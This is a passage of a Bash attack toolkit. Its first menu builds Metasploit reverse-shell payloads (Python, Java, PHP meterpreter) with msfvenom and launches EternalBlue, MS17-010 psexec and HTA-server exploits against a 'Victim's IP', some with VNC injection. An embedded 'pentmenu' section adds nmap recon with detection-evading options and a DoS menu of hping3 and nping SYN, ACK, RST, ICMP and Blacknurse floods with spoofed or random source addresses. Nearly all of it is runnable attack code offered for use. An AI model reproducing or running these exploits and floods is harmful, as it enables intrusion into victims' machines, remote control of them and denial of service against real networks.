!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!
!Your payload: test.py!
!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!

Waiting for listener...
 
'

msfconsole -q -x " use exploit/multi/handler; set payload python/meterpreter/reverse_tcp;  set lhost 127.0.0.1 ; set lport 4400 ; exploit -j ; jobs ; "



elif [ "$x" == "$jar" ]; then                        #JAVA
read -p $'  \e[1;31m[\e[0m\e[1;37m~\e[0m\e[1;31m]\e[0m\e[1;92m Input IP Address \e[0m\e[1;96m: \e[0m\e[1;93m\en' ip
read -p $'  \e[1;31m[\e[0m\e[1;37m~\e[0m\e[1;31m]\e[0m\e[1;92m Input port Address \e[0m\e[1;96m: \e[0m\e[1;93m\en' port
msfvenom -p java/meterpreter/reverse_tcp lhost=$ip lport=$port -f jar > test.jar
echo -e '

!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!
!Your payload: test.jar!
!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!

Waiting for listener...
 
'

msfconsole -q -x " use exploit/multi/handler; set payload java/meterpreter/reverse_tcp;  set lhost 127.0.0.1 ; set lport 4400 ; exploit -j ; jobs ; "






elif [ "$x" == "$php" ]; then                        #PHP
read -p $'  \e[1;31m[\e[0m\e[1;37m~\e[0m\e[1;31m]\e[0m\e[1;92m Input IP Address \e[0m\e[1;96m: \e[0m\e[1;93m\en' ip
read -p $'  \e[1;31m[\e[0m\e[1;37m~\e[0m\e[1;31m]\e[0m\e[1;92m Input port Address \e[0m\e[1;96m: \e[0m\e[1;93m\en' port
msfvenom -p php/meterpreter/reverse_tcp lhost=$ip lport=$port > test.php
echo -e '

!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!
!Your payload: test.php!
!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!

Waiting for listener...
 
'

msfconsole -q -x " use exploit/multi/handler; set payload php/meterpreter/reverse_tcp;  set lhost 127.0.0.1 ; set lport 4400 ; eexploit -j ; jobs ; "




elif [ "$x" == "$scan" ]; then                        #SCAN
echo "Victim's IP:"
read r

msfconsole -q -x " use auxiliary/scanner/smb/smb_ms17_010; set rhosts $r ; exploit ;exit ;"
echo ' '
echo '           Press ENTER to Main Menu '
echo ' '
read


elif [ "$x" == "$eternalblue" ]; then                        #ETERNALBLUE
echo "Victim's IP:"
read r

msfconsole -q -x " use exploit/windows/smb/ms17_010_eternalblue; set payload windows/x64/meterpreter/reverse_tcp;  set lhost $ip ; set rhost $r ; exploit ; "



elif [ "$x" == "$eternalbluerd" ]; then                        #ETERNALBLUERD
echo "Victim's IP:"
read r

msfconsole -q -x " use exploit/windows/smb/ms17_010_eternalblue; set payload windows/x64/vncinject/reverse_tcp;  set lhost $ip ; set rhost $r ; set viewonly false ; exploit ; "




elif [ "$x" == "$psexec" ]; then                        #PSEXEC
echo "Victim's IP:" 
read r

msfconsole -q -x " use exploit/windows/smb/ms17_010_psexec; set lhost $ip ; set rhost $r ; exploit ;"


elif [ "$x" == "$psexecrd" ]; then                        #PSEXECRD
echo "Victim's IP:"
read r

msfconsole -q -x " use exploit/windows/smb/ms17_010_psexec; set payload windows/vncinject/reverse_tcp;  set lhost $ip ; set rhost $r ; set viewonly false ; exploit ; "



elif [ "$x" == "$hta" ]; then                        #HTA
echo 'Uripath: (/)'
read u
msfconsole -q -x " use exploit/windows/misc/hta_server; set srvhost $ip; set uripath /$u; set payload windows/meterpreter/reverse_tcp; set lhost $ip ; exploit ;"



elif [ "$x" == "$me" ]; then                 #CONTACT WITH ME                      

clear

echo -e '\e[1;33m

 ,_    __,    _   __   __, _|_ 
/  |  /  |  |/ \_/  \_/  |  |  
   |_/\_/|_/|__/ \__/ \_/|_/|_/
           /|                  
           \| \e[0m


 \e[1;31m
 https://github.com/rap0at
 \e[1;34m



                          Press ENTER to Main Menu
'
sleep 1
printf "\e[0m\n"
printf "\e[0m\n"
exit 1

else
printf " \e[1;91m[\e[0m\e[1;97m!\e[0m\e[1;91m]\e[0m\e[1;93m Invalid option \e[1;91m[\e[0m\e[1;97m!\e[0m\e[1;91m]\e[0m\n"
sleep 1
banner
menu
fi

}
pentmenu(){
#!/bin/bash
#set the prompt to show you are in pentmenu and not standard shell
PS3="Pentmenu>"

##MAINMENU##
##################
##START MAINMENU##
mainmenu()
{
#build a main menu using bash select
#from here, the various sub menus can be selected and from them, modules can be run
mainmenu=("Recon" "DOS" "Extraction" "View Readme" "Quit")
select opt in "${mainmenu[@]}"; do
	if [ "$opt" = "Quit" ]; then
	echo "Quitting...Thank you for using pentmenu!" && sleep 1 && clear
	exit 0
	elif [ "$opt" = "Recon" ]; then
reconmenu
	elif [ "$opt" = "DOS" ]; then
dosmenu
    elif [ "$opt" = "Extraction" ]; then
extractionmenu
  	elif [ "$opt" = "View Readme" ]; then
showreadme
	else
#if no valid option is chosen, chastise the user
	echo "That's not a valid option! Hit Return to show main menu"
	fi
done
}
##END MAINMENU##
################
##/MAINMENU##


##RECON##
###################
##START RECONMENU##
reconmenu()
{
#build a menu for the recon modules using bash select
		reconmenu=("Show IP" "DNS Recon" "Ping Sweep" "Quick Scan" "Detailed Scan" "UDP Scan" "Check Server Uptime" "IPsec Scan" "Go back")
	select reconopt in "${reconmenu[@]}"; do
#show external IP & interface IP(s)
	if [ "$reconopt" = "Show IP" ]; then
		showip
#DNS Recon
    elif [ "$reconopt" = "DNS Recon" ]; then
        dnsrecon
#Ping Sweep
    elif [ "$reconopt" = "Ping Sweep" ]; then
        pingsweep
#Recon Network
    elif [ "$reconopt" = "Quick Scan" ]; then
        quickscan
#Stealth Scan
    elif [ "$reconopt" = "Detailed Scan" ]; then
        detailedscan
#UDP Scan
	elif [ "$reconopt" = "UDP Scan" ]; then
		udpscan
#Check uptime of server
    elif [ "$reconopt" = "Check Server Uptime" ]; then
        checkuptime
#IPsec Scan
	elif [ "$reconopt" = "IPsec Scan" ]; then
		ipsecscan
#Go back
	elif [ "$reconopt" = "Go back" ]; then
		mainmenu
## Default if no menu option selected is to return an error
	else
  		echo  "That's not a valid option! Hit Return to show menu"
	fi
	done
}
##END RECONMENU##
#################

################
##START SHOWIP##
showip()
{		echo "External IP lookup uses curl..."
		echo "External IP is detected as:"
#use curl to lookup external IP
		curl https://icanhazip.com/s/
		echo ""
		echo ""
#show interface IP's
		echo "Interface IP's are:"
		ip a|grep inet
#if ip a command fails revert to ifconfig
	if ! [[ $? = 0 ]]; then
		ifconfig|grep inet
	fi
		echo ""
}
##END SHOWIP##
##############

##################
##START DNSRECON##
dnsrecon()
{ echo "This module performs passive recon via forward/reverse name lookups for the target (as appropriate) and performs a whois lookup"
	echo "Enter target:"
#need a target IP/hostname to check
	read -i $TARGET -e TARGET
host $TARGET
#if host command doesnt work try nslookup instead
if ! [[ $? = 0 ]]; then
nslookup $TARGET
fi
#run a whois lookup on the target
sleep 1 && whois -H $TARGET
if ! [[ $? = 0 ]]; then
#if whois fails, do a curl lookup to ipinfo.io
sleep 1 && curl ipinfo.io/$TARGET
fi
}
##END DNSRECON##
################

###################
##START PINGSWEEP##
pingsweep()
{ echo "This module performs a simple ICMP echo 'ping' sweep"
	echo "Please enter the target (e.g. 192.168.1.0/24):"
#need to know the subnet to scan for live hosts using pings
	read -i $TARGET -e TARGET
#launch ping sweep using nmap
#this could be done with ping command, but that is extremely difficult to code in bash for unusual subnets so we use nmap instead
sudo nmap -sP -PE $TARGET --reason
}
##END PINGSWEEP##
#################

######################
##START QUICKSCAN##
quickscan()
{ echo "This module conducts a scan using nmap"
echo "It is designed to scan an entire network for common open ports"
echo "It will perform a TCP SYN port scan of the 1000 most common ports"
echo "Depending on the target, the scan might take a long time to finish"
echo "Please enter the target host/IP/subnet:"
#we need to know where to scan.  Whilst a hostname is possible, this module is designed to scan a subnet range
read -i $TARGET -e TARGET
echo "Enter the speed of scan (0 means very slow and 5 means fast).
Slower scans are more subtle, but faster means less waiting around.
Default is 3:"
#How fast should we scan the target?
#Faster speed is more likely to be detected by IDS, but is less waiting around
read -i $SPEED -e SPEED
: ${SPEED:=3}
#launch the scan
sudo nmap -Pn -sS -T $SPEED $TARGET --reason
}
## END QUICKSCAN##
#####################

#####################
##START DETAILEDSCAN##
detailedscan()
{ echo "This module performs a scan using nmap"
echo "It is designed to perform a detailed scan of a specific host but can be used against an entire network"
echo "This scans ALL ports on the target. It also attempts OS detection and gathers service information"
echo "This scan might take a very long time to finish, please be patient"
echo "Enter the hostname/IP/subnet to scan:"
#need a target hostname/IP
read -i $TARGET -e TARGET
echo "Enter the speed of scan (0 means very slow and 5 means fast).
Slower scans are more subtle, but faster means less waiting around.
Default is 3:"
#How fast should we scan the target?
#Faster speed is more likely to be detected by IDS, but is less waiting around
read -i $SPEED -e SPEED
: ${SPEED:=3}
#scan using nmap.  Note the change in user-agent from the default nmap value to help avoid detection
sudo nmap -script-args http.useragent="Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/79.0.3945.74 Safari/537.36 Edg/79.0.309.43" -Pn -p 1-65535 -sV -sC -A -O -T $SPEED $TARGET --reason
}
##END DETAILEDSCAN##
###################

#################
##START UDPSCAN##
udpscan()
{ echo "This module lets you scan a host/network for open UDP ports"
echo "It scans ALL ports on the target system. This may take some time, please be patient"
echo "Enter the host/subnet to scan:"
#need a target IP/hostname
read -i $TARGET -e TARGET
#How fast should we scan the target?
#Faster speed is more likely to be detected by IDS, but is less waiting around
echo "Enter the speed of scan (0 means very slow and 5 means fast).
Slower scans are more subtle, but faster means less waiting around.
Default is 3:"
read -i $SPEED -e SPEED
: ${SPEED:=3}
#launch the scan using nmap
sudo nmap -Pn -p 1-65535 -sU -T $SPEED $TARGET --reason
}
##END UDPSCAN##
###############

#####################
##START CHECKUPTIME##
checkuptime()
{ echo "This module will attempt to estimate the uptime of a given server, using hping3"
  echo "This is not guaranteed to work"
  echo "Enter your target:"
#need a target IP/hostname
  read -i $TARGET -e TARGET
#need a target port
  echo "Enter port (default is 80):"
  read -i $PORT -e PORT
  : ${PORT:=80}
#check a valid integer is given for the port, anything else is invalid
	if ! [[ "$PORT" =~ ^[0-9]+$ ]]; then
PORT=80 && echo "Invalid port, reverting to port 80"
	elif [ "$PORT" -lt "1" ]; then
PORT=80 && echo "Invalid port number chosen! Reverting port 80"
	elif [ "$PORT" -gt "65535" ]; then
PORT=80 && echo "Invalid port chosen! Reverting to port 80"
	else echo "Using Port $PORT"
	fi
#how many times to retry the check?
  echo "Retries? (3 is ideal and default, 2 might also work)"
  read -i $RETRY -e RETRY
  : ${RETRY:=3}
  echo "Starting.."
#use hping3 and enable the TCP timestamp option, and try to guess the timestamp update frequency and the remote system uptime.
#this might not work, but sometimes it does work very well
  sudo hping3 --tcp-timestamp -S $TARGET -p $PORT -c $RETRY | grep uptime
  echo "Done."
}
##END CHECKUPTIME##
###################

####################
##START IPSEC SCAN##
ipsecscan()
{ echo "Please enter the target hostname or IP:"
#we need to know where to scan
read -i $TARGET -e TARGET
# Encryption algorithms: DES, Triple-DES, AES/128, AES/192 and AES/256
ENCLIST="1 5 7/128 7/192 7/256"
# Hash algorithms: MD5, SHA1, SHA-256, SHA-384 and SHA-512
HASHLIST="1 2 4 5 6"
# Authentication methods: Pre-Shared Key, RSA Signatures, Hybrid Mode and XAUTH
AUTHLIST="1 3 64221 65001"
# Diffie-Hellman groups: 1, 2, 5 and 12
GROUPLIST="1 2 5 12"
for ENC in $ENCLIST; do
   for HASH in $HASHLIST; do
      for AUTH in $AUTHLIST; do
         for GROUP in $GROUPLIST; do
          sudo echo "--trans=$ENC,$HASH,$AUTH,$GROUP" | sudo xargs --max-lines=8 ike-scan --retry=1 -R -M $TARGET | grep -v "Starting" | grep -v "0 returned handshake; 0 returned notify"
         done
      done
   done
done
}
##END IPSECSCAN##
#################
##/RECON##
#############


##DOS##
#################
##START DOSMENU##
dosmenu()
{
#display a menu for the DOS module using bash select
		dosmenu=("ICMP Echo Flood" "ICMP Blacknurse" "TCP SYN Flood" "TCP ACK Flood" "TCP RST Flood" "TCP XMAS Flood" "UDP Flood" "SSL DOS" "Slowloris" "IPsec DOS" "Distraction Scan" "DNS NXDOMAIN Flood" "Go back")
	select dosopt in "${dosmenu[@]}"; do
#ICMP Echo Flood
	if [ "$dosopt" = "ICMP Echo Flood" ]; then
		icmpflood
#ICMP Blacknurse
	elif [ "$dosopt" = "ICMP Blacknurse" ]; then
		blacknurse
#TCP SYN Flood DOS
 	elif [ "$dosopt" = "TCP SYN Flood" ]; then
		synflood
#TCP ACK Flood
	elif [ "$dosopt" = "TCP ACK Flood" ]; then
		ackflood
#TCP RST Flood
	elif [ "$dosopt" = "TCP RST Flood" ]; then
		rstflood
#TCP XMAS Flood
	elif [ "$dosopt" = "TCP XMAS Flood" ]; then
		xmasflood
#UDP Flood
 	elif [ "$dosopt" = "UDP Flood" ]; then
		udpflood
#SSL DOS
	elif [ "$dosopt" = "SSL DOS" ]; then
		ssldos
#Slowloris
	elif [ "$dosopt" = "Slowloris" ]; then
		slowloris
#IPsec DOS
	elif [ "$dosopt" = "IPsec DOS" ]; then
		ipsecdos
#Distraction scan
	elif [ "$dosopt" = "Distraction Scan" ]; then
		distractionscan
#DNS NXDOMAIN Flood
	elif [ "$dosopt" = "DNS NXDOMAIN Flood" ]; then
		nxdomainflood
#Go back
	elif [ "$dosopt" = "Go back" ]; then
		mainmenu
	else
#Default if no valid menu option selected is to return an error
  	echo  "That's not a valid option! Hit Return to show menu"
	fi
done
}
##END DOSMENU##
###############

###################
##START ICMPFLOOD##
icmpflood()
{
		echo "Preparing to launch ICMP Echo Flood using hping3"
		echo "Enter target IP/hostname:"
#need a target IP/hostname
		read -i $TARGET -e TARGET
#What source address to use? Manually defined, or random, or outgoing interface IP?
		echo "Enter Source IP, or [r]andom or [i]nterface IP (default):"
	read -i $SOURCE -e SOURCE
	: ${SOURCE:=i}
	if [[ "$SOURCE" =~ ^([0-9]{1,3})[.]([0-9]{1,3})[.]([0-9]{1,3})[.]([0-9]{1,3})$ ]]; then
		echo "Starting ICMP echo Flood. Use 'Ctrl c' to end and return to menu"
		sudo hping3 -1 --flood --spoof $SOURCE $TARGET
	elif [ "$SOURCE" = "r" ]; then
		echo "Starting ICMP Echo Flood. Use 'Ctrl c' to end and return to menu"
		sudo hping3 -1 --flood --rand-source $TARGET
	elif [ "$SOURCE" = "i" ]; then
		echo "Starting ICMP Echo Flood. Use 'Ctrl c' to end and return to menu"
		sudo hping3 -1 --flood $TARGET
	else echo "Not a valid option!  Using interface IP"
		echo "Starting ICMP Echo Flood. Use 'Ctrl c' to end and return to menu"
		sudo hping3 -1 --flood $TARGET
	fi
}
##END ICMPFLOOD##
#################	

####################
##START BLACKNURSE##
blacknurse()
{		
		echo "Preparing to launch ICMP Blacknurse Flood using hping3"
		echo "Enter target IP/hostname:"
#need a target IP/hostname
		read -i $TARGET -e TARGET
#What source address to use? Manually defined, or random, or outgoing interface IP?
		echo "Enter Source IP, or [r]andom or [i]nterface IP (default):"
	read -i $SOURCE -e SOURCE
	: ${SOURCE:=i}
	if [[ "$SOURCE" =~ ^([0-9]{1,3})[.]([0-9]{1,3})[.]([0-9]{1,3})[.]([0-9]{1,3})$ ]]; then
		echo "Starting Blacknurse Flood. Use 'Ctrl c' to end and return to menu"
		sudo hping3 -1 -C 3 -K 3 --flood --spoof $SOURCE $TARGET
	elif [ "$SOURCE" = "r" ]; then
		echo "Starting Blacknurse Flood. Use 'Ctrl c' to end and return to menu"
		sudo hping3 -1 -C 3 -K 3 --flood --rand-source $TARGET
	elif [ "$SOURCE" = "i" ]; then
		echo "Starting Blacknurse Flood. Use 'Ctrl c' to end and return to menu"
		sudo hping3 -1 -C 3 -K 3 --flood $TARGET
	else echo "Not a valid option!  Using interface IP"
		echo "Starting Blacknurse Flood. Use 'Ctrl c' to end and return to menu"
		sudo hping3 -1 -C 3 -K 3 --flood $TARGET
	fi
}
##END BLACKNURSE##
##################


#####################
##START TCPSYNFLOOD##
synflood()
{		echo "TCP SYN Flood uses hping3...checking for hping3..."
	if test -f "/usr/sbin/hping3"; then echo "hping3 found, continuing!";
#hping3 is found, so use that for TCP SYN Flood
		echo "Enter target:"
#need a target IP/hostname
	read -i $TARGET -e TARGET
#need a port to send TCP SYN packets to
		echo "Enter target port (defaults to 80):"
	read -i $PORT -e PORT
	: ${PORT:=80}
#check a valid integer is given for the port, anything else is invalid
	if ! [[ "$PORT" =~ ^[0-9]+$ ]]; then
PORT=80 && echo "Invalid port, reverting to port 80"
	elif [ "$PORT" -lt "1" ]; then
PORT=80 && echo "Invalid port number chosen! Reverting port 80"
	elif [ "$PORT" -gt "65535" ]; then
PORT=80 && echo "Invalid port chosen! Reverting to port 80"
	else echo "Using Port $PORT"
	fi
#What source address to use? Manually defined, or random, or outgoing interface IP?
		echo "Enter Source IP, or [r]andom or [i]nterface IP (default):"
	read -i $SOURCE -e SOURCE
	: ${SOURCE:=i}
#should any data be sent with the SYN packet?  Default is to send no data
	echo "Send data with SYN packet? [y]es or [n]o (default)"
	read -i $SENDDATA -e SENDDATA
	: ${SENDDATA:=n}
	if [[ $SENDDATA = y ]]; then
#we've chosen to send data, so how much should we send?
	echo "Enter number of data bytes to send (default 3000):"
	read -i $DATA -e DATA
	: ${DATA:=3000}
#If not an integer is entered, use default
	if ! [[ "$DATA" =~ ^[0-9]+$ ]]; then
	DATA=3000 && echo "Invalid integer!  Using data length of 3000 bytes"
	fi
#if $SENDDATA is not equal to y (yes) then send no data
	else DATA=0
	fi
#start TCP SYN flood using values defined earlier
#note that virtual fragmentation is set.  The default for hping3 is 16 bytes.
#fragmentation should therefore place more stress on the target system
	if [[ "$SOURCE" =~ ^([0-9]{1,3})[.]([0-9]{1,3})[.]([0-9]{1,3})[.]([0-9]{1,3})$ ]]; then
		echo "Starting TCP SYN Flood. Use 'Ctrl c' to end and return to menu"
		sudo hping3 --flood -d $DATA --frag --spoof $SOURCE -p $PORT -S $TARGET
	elif [ "$SOURCE" = "r" ]; then
		echo "Starting TCP SYN Flood. Use 'Ctrl c' to end and return to menu"
		sudo hping3 --flood -d $DATA --frag --rand-source -p $PORT -S $TARGET
	elif [ "$SOURCE" = "i" ]; then
		echo "Starting TCP SYN Flood. Use 'Ctrl c' to end and return to menu"
		sudo hping3 -d $DATA --flood --frag -p $PORT -S $TARGET
	else echo "Not a valid option!  Using interface IP"
		echo "Starting TCP SYN Flood. Use 'Ctrl c' to end and return to menu"
		sudo hping3 --flood -d $DATA --frag -p $PORT -S $TARGET
	fi
#No hping3 so using nping for TCP SYN Flood
	else echo "hping3 not found :( trying nping instead"
		echo ""
		echo "Trying TCP SYN Flood with nping..this will work but is not ideal"
#need a valid target ip/hostname
		echo "Enter target:"
	read -i $TARGET -e TARGET
#need a valid target port
		echo "Enter target port (defaults to 80):"
	read -i $PORT -e PORT
		: ${PORT:=80}
#check a valid integer is given for the port, anything else is invalid
	if ! [[ "$PORT" =~ ^[0-9]+$ ]]; then
PORT=80 && echo "Invalid port, reverting to port 80"
	elif [ "$PORT" -lt "1" ]; then
PORT=80 && echo "Invalid port number chosen! Reverting port 80"
	elif [ "$PORT" -gt "65535" ]; then
PORT=80 && echo "Invalid port chosen! Reverting to port 80"
	else echo "Using Port $PORT"
	fi
#define source IP or use outgoing interface IP
		echo "Enter Source IP or use [i]nterface IP (default):"
	read -i $SOURCE -e SOURCE
		: ${SOURCE:=i}
#How many packets to send per second?  default is 10k
		echo "Enter number of packets to send per second (default is 10,000):"
	read RATE
		: ${RATE:=10000}
#how many packets in total to send?
#default is 100k, so using default values will send 10k packets per second for 10 seconds
		echo "Enter total number of packets to send (default is 100,000):"
	read TOTAL
		: ${TOTAL:=100000}
		echo "Starting TCP SYN Flood..."
#begin TCP SYN flood using values defined earlier
	if 	[ "$SOURCE" = "i" ]; then
		sudo nping --tcp --dest-port $PORT --flags syn --rate $RATE -c $TOTAL -v-1 $TARGET
	else sudo nping --tcp --dest-port $PORT --flags syn --rate $RATE -c $TOTAL -v-1 -S $SOURCE $TARGET
	fi
	fi
}
##END TCPSYNFLOOD##
###################

#####################
##START TCPACKFLOOD##
ackflood()
{		echo "TCP ACK Flood uses hping3...checking for hping3..."
	if test -f "/usr/sbin/hping3"; then echo "hping3 found, continuing!";
#hping3 is found, so use that for TCP ACK Flood
		echo "Enter target:"
#need a target IP/hostname
	read -i $TARGET -e TARGET
#need a port to send TCP ACK packets to
		echo "Enter target port (defaults to 80):"
	read -i $PORT -e PORT
	: ${PORT:=80}
#check a valid integer is given for the port, anything else is invalid
	if ! [[ "$PORT" =~ ^[0-9]+$ ]]; then
PORT=80 && echo "Invalid port, reverting to port 80"
	elif [ "$PORT" -lt "1" ]; then
PORT=80 && echo "Invalid port number chosen! Reverting port 80"
	elif [ "$PORT" -gt "65535" ]; then
PORT=80 && echo "Invalid port chosen! Reverting to port 80"
	else echo "Using Port $PORT"
	fi
#What source address to use? Manually defined, or random, or outgoing interface IP?
		echo "Enter Source IP, or [r]andom or [i]nterface IP (default):"
	read -i $SOURCE -e SOURCE
	: ${SOURCE:=i}
#should any data be sent with the ACK packet?  Default is to send no data
	echo "Send data with ACK packet? [y]es or [n]o (default)"
	read -i $SENDDATA -e SENDDATA
	: ${SENDDATA:=n}
	if [[ $SENDDATA = y ]]; then
#we've chosen to send data, so how much should we send?
	echo "Enter number of data bytes to send (default 3000):"
	read -i $DATA -e DATA
	: ${DATA:=3000}
#If not an integer is entered, use default
	if ! [[ "$DATA" =~ ^[0-9]+$ ]]; then
	DATA=3000 && echo "Invalid integer!  Using data length of 3000 bytes"
	fi
#if $SENDDATA is not equal to y (yes) then send no data
	else DATA=0
	fi
#start TCP ACK flood using values defined earlier
#note that virtual fragmentation is set.  The default for hping3 is 16 bytes.
#fragmentation should therefore place more stress on the target system
	if [[ "$SOURCE" =~ ^([0-9]{1,3})[.]([0-9]{1,3})[.]([0-9]{1,3})[.]([0-9]{1,3})$ ]]; then
		echo "Starting TCP ACK Flood. Use 'Ctrl c' to end and return to menu"
		sudo hping3 --flood -d $DATA --frag --spoof $SOURCE -p $PORT -A $TARGET
	elif [ "$SOURCE" = "r" ]; then
		echo "Starting TCP ACK Flood. Use 'Ctrl c' to end and return to menu"
		sudo hping3 --flood -d $DATA --frag --rand-source -p $PORT -A $TARGET
	elif [ "$SOURCE" = "i" ]; then
		echo "Starting TCP ACK Flood. Use 'Ctrl c' to end and return to menu"
		sudo hping3 -d $DATA --flood --frag -p $PORT -A $TARGET
	else echo "Not a valid option!  Using interface IP"
		echo "Starting TCP ACK Flood. Use 'Ctrl c' to end and return to menu"
		sudo hping3 --flood -d $DATA --frag -p $PORT -A $TARGET
	fi
#No hping3 so using nping for TCP ACK Flood
	else echo "hping3 not found :( trying nping instead"
		echo ""
		echo "Trying TCP ACK Flood with nping..this will work but is not ideal"
#need a valid target ip/hostname
		echo "Enter target:"
	read -i $TARGET -e TARGET
#need a valid target port
		echo "Enter target port (defaults to 80):"
	read -i $PORT -e PORT
	: ${PORT:=80}
#check a valid integer is given for the port, anything else is invalid
	if ! [[ "$PORT" =~ ^[0-9]+$ ]]; then
PORT=80 && echo "Invalid port, reverting to port 80"
	elif [ "$PORT" -lt "1" ]; then
PORT=80 && echo "Invalid port number chosen! Reverting port 80"
	elif [ "$PORT" -gt "65535" ]; then
PORT=80 && echo "Invalid port chosen! Reverting to port 80"
	else echo "Using Port $PORT"
	fi
#define source IP or use outgoing interface IP
		echo "Enter Source IP or use [i]nterface IP (default):"
	read -i $SOURCE -e SOURCE
		: ${SOURCE:=i}
#How many packets to send per second?  default is 10k
		echo "Enter number of packets to send per second (default is 10,000):"
	read RATE
		: ${RATE:=10000}
#how many packets in total to send?
#default is 100k, so using default values will send 10k packets per second for 10 seconds
		echo "Enter total number of packets to send (default is 100,000):"
	read TOTAL
		: ${TOTAL:=100000}
		echo "Starting TCP ACK Flood..."
#begin TCP ACK flood using values defined earlier
	if 	[ "$SOURCE" = "i" ]; then
		sudo nping --tcp --dest-port $PORT --flags ack --rate $RATE -c $TOTAL -v-1 $TARGET
	else sudo nping --tcp --dest-port $PORT --flags ack --rate $RATE -c $TOTAL -v-1 -S $SOURCE $TARGET
	fi
	fi
}
##END TCPACKFLOOD##
###################

#####################
##START TCPRSTFLOOD##
rstflood()
{		echo "TCP RST Flood uses hping3...checking for hping3..."
	if test -f "/usr/sbin/hping3"; then echo "hping3 found, continuing!";
#hping3 is found, so use that for TCP RST Flood
		echo "Enter target:"
#need a target IP/hostname
	read -i $TARGET -e TARGET
#need a port to send TCP RST packets to
		echo "Enter target port (defaults to 80):"
	read -i $PORT -e PORT
	: ${PORT:=80}
#check a valid integer is given for the port, anything else is invalid
	if ! [[ "$PORT" =~ ^[0-9]+$ ]]; then
PORT=80 && echo "Invalid port, reverting to port 80"
	elif [ "$PORT" -lt "1" ]; then
PORT=80 && echo "Invalid port number chosen! Reverting port 80"
	elif [ "$PORT" -gt "65535" ]; then
PORT=80 && echo "Invalid port chosen! Reverting to port 80"
	else echo "Using Port $PORT"
	fi
#What source address to use? Manually defined, or random, or outgoing interface IP?
		echo "Enter Source IP, or [r]andom or [i]nterface IP (default):"
	read -i $SOURCE -e SOURCE
	: ${SOURCE:=i}
#should any data be sent with the RST packet?  Default is to send no data
	echo "Send data with RST packet? [y]es or [n]o (default)"
	read -i $SENDDATA -e SENDDATA
	: ${SENDDATA:=n}
	if [[ $SENDDATA = y ]]; then
#we've chosen to send data, so how much should we send?
	echo "Enter number of data bytes to send (default 3000):"
	read -i $DATA -e DATA
	: ${DATA:=3000}
#If not an integer is entered, use default
	if ! [[ "$DATA" =~ ^[0-9]+$ ]]; then
	DATA=3000 && echo "Invalid integer!  Using data length of 3000 bytes"
	fi
#if $SENDDATA is not equal to y (yes) then send no data
	else DATA=0
	fi
#start TCP RST flood using values defined earlier
#note that virtual fragmentation is set.  The default for hping3 is 16 bytes.
#fragmentation should therefore place more stress on the target system
	if [[ "$SOURCE" =~ ^([0-9]{1,3})[.]([0-9]{1,3})[.]([0-9]{1,3})[.]([0-9]{1,3})$ ]]; then
		echo "Starting TCP RST Flood. Use 'Ctrl c' to end and return to menu"
		sudo hping3 --flood -d $DATA --frag --spoof $SOURCE -p $PORT -R $TARGET
	elif [ "$SOURCE" = "r" ]; then
		echo "Starting TCP RST Flood. Use 'Ctrl c' to end and return to menu"
		sudo hping3 --flood -d $DATA --frag --rand-source -p $PORT -R $TARGET
	elif [ "$SOURCE" = "i" ]; then
		echo "Starting TCP RST Flood. Use 'Ctrl c' to end and return to menu"
		sudo hping3 -d $DATA --flood --frag -p $PORT -R $TARGET
	else echo "Not a valid option!  Using interface IP"
		echo "Starting TCP RST Flood. Use 'Ctrl c' to end and return to menu"
		sudo hping3 --flood -d $DATA --frag -p $PORT -R $TARGET
	fi
#No hping3 so using nping for TCP RST Flood
	else echo "hping3 not found :( trying nping instead"
		echo ""
		echo "Trying TCP RST Flood with nping..this will work but is not ideal"
#need a valid target ip/hostname
		echo "Enter target:"
	read -i $TARGET -e TARGET
#need a valid target port
		echo "Enter target port (defaults to 80):"
	read -i $PORT -e PORT
	: ${PORT:=80}
#check a valid integer is given for the port, anything else is invalid
	if ! [[ "$PORT" =~ ^[0-9]+$ ]]; then
PORT=80 && echo "Invalid port, reverting to port 80"
	elif [ "$PORT" -lt "1" ]; then
PORT=80 && echo "Invalid port number chosen! Reverting port 80"
	elif [ "$PORT" -gt "65535" ]; then
PORT=80 && echo "Invalid port chosen! Reverting to port 80"
	else echo "Using Port $PORT"
	fi
#define source IP or use outgoing interface IP
		echo "Enter Source IP or use [i]nterface IP (default):"
	read -i $SOURCE -e SOURCE
		: ${SOURCE:=i}
#How many packets to send per second?  default is 10k
		echo "Enter number of packets to send per second (default is 10,000):"
	read RATE
		: ${RATE:=10000}
#how many packets in total to send?
#default is 100k, so using default values will send 10k packets per second for 10 seconds
		echo "Enter total number of packets to send (default is 100,000):"
	read TOTAL
		: ${TOTAL:=100000}
		echo "Starting TCP RST Flood..."
#begin TCP RST flood using values defined earlier
	if 	[ "$SOURCE" = "i" ]; then
		sudo nping --tcp --dest-port $PORT --flags rst --rate $RATE -c $TOTAL -v-1 $TARGET
	else sudo nping --tcp --dest-port $PORT --flags rst --rate $RATE -c $TOTAL -v-1 -S $SOURCE $TARGET
	fi
	fi
}
##END TCPRSTFLOOD##
###################

#####################
##START TCPXMASFLOOD##
xmasflood()
{		echo "TCP XMAS Flood uses hping3...checking for hping3..."
	if test -f "/usr/sbin/hping3"; then echo "hping3 found, continuing!";
#hping3 is found, so use that for TCP XMAS Flood
		echo "Enter target:"
#need a target IP/hostname
	read -i $TARGET -e TARGET
#need a port to send TCP XMAS packets to
		echo "Enter target port (defaults to 80):"
	read -i $PORT -e PORT
	: ${PORT:=80}
#check a valid integer is given for the port, anything else is invalid
	if ! [[ "$PORT" =~ ^[0-9]+$ ]]; then
PORT=80 && echo "Invalid port, reverting to port 80"
	elif [ "$PORT" -lt "1" ]; then
PORT=80 && echo "Invalid port number chosen! Reverting port 80"
	elif [ "$PORT" -gt "65535" ]; then
PORT=80 && echo "Invalid port chosen! Reverting to port 80"
	else echo "Using Port $PORT"
	fi
#What source address to use? Manually defined, or random, or outgoing interface IP?
		echo "Enter Source IP, or [r]andom or [i]nterface IP (default):"
	read -i $SOURCE -e SOURCE
	: ${SOURCE:=i}
#should any data be sent with the XMAS packet?  Default is to send no data
	echo "Send data with XMAS packet? [y]es or [n]o (default)"
	read -i $SENDDATA -e SENDDATA
	: ${SENDDATA:=n}
	if [[ $SENDDATA = y ]]; then
#we've chosen to send data, so how much should we send?
